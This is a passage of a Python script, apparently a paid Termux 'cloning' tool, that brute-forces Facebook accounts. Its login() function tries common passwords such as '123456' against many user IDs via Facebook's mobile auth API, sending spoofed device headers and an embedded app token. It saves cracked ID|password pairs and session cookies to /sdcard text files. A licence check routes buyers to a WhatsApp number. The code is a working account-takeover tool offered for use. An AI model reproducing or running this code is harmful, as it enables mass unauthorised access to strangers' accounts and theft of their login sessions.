                        print(f"\r\r[PRINCE-OK] {xd} • {ps}\n[🍪][spring_green1]{coki}")
                        open("/sdcard/SD-OK.txt", "a").write(xd + "|" + ps + "|" + coki + "\n")
                        oks.append(xd)
                        break
                except KeyError:
                    pass


            elif "checkpoint" in heron_brand:
                # coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                # print(f"\r\r[green] [OK-ID] {uid} | {ps} \n [🤫]{coki}")
                pass
            else:
                continue
        loop += 1
    except Exception as e:
        time.sleep(30)


def main():
    info()
    sort.clear()
    sort.logo()
    print(
        "[b]    [red1][A] [chartreuse1]File Clone [blue][[green]B[red1]D[blue]-[orange1]I[white]N[bright_green]D[blue]]")
    print("[b]    [red1][B] [spring_green2]Old Uid Clone")
    print("[b]    [red1][C] [spring_green1]Random (more..2)")

    print(sort.line())
    fast_choice = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
    if fast_choice in ["1", "01", "a", "A"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]File Clone")
        print(sort.line())
        time.sleep(2)
        filee()
    elif fast_choice in ["2", "02", "b", "B"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Old Uid Crack")
        print(sort.line())
        time.sleep(2)
        old()
    elif fast_choice in ["3", "03", "c", "C"]:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Random Crack")
        print(sort.line())
        time.sleep(2)
        ran()
    else:
        print("     [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Wrong Option")
        print(sort.line())
        time.sleep(2)
        main()


def login(uid, meth):
    global oks, loop
    Session = requests.session()
    try:
        sys.stdout.write(
            f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789"]:
            if meth in ["1", "01", "A", "a"]:
                agent = ua()
            else:
                agent = Samsung()
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": agent,
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"}
            rp = Session.get(
                "https://b-api.facebook.com/method/auth.login?format=json&email=" + str(uid) + "&password=" + str(
                    pw) + "&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",
                headers=headers).json()
            if "session_key" in rp:
                oks.append(uid)
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(
                    f"\r\r[b]    [bright_white]┝[red1]➤[spring_green1][[deep_pink2]OK[spring_green1]] [green_yellow]{uid} [red3]• [spring_green1]{pw}")
                open("/sdcard/pyc_old.txt", "a").write(uid + "|" + pw + "\n")
                break

            else:
                continue
        loop += 1
    except:
        time.sleep(30)


K1 = str(os.getuid())
K2 = str(os.getgid())
num_key = "".join(K1 + K2)

cm = num_key.encode("ASCII")
cmr = base64.b64encode(cm)
cm2 = str(cmr).upper().replace("B", "$")
showkey = cm2.replace("'", "").replace("==", "")


def approve():
    url = "https://github.com/Shadid21/Prince/blob/main/approval.txt"  # Your Link
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax = buffer.getvalue().decode('utf-8')
    except:
        sys.exit("[!!] Internet Error...")

    if showkey in datax:
        sort.clear()
        print("Checking Subscription")
        time.sleep(3)
        main()
    else:
        sort.logo()

        print("your Key ->   " + showkey)
        input("This is paid tool bro. If you want to buy press enter. ")
        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
        os.system('am start https://wa.me/+8801617687239?text=' + tks)
        sys.exit()


approve()
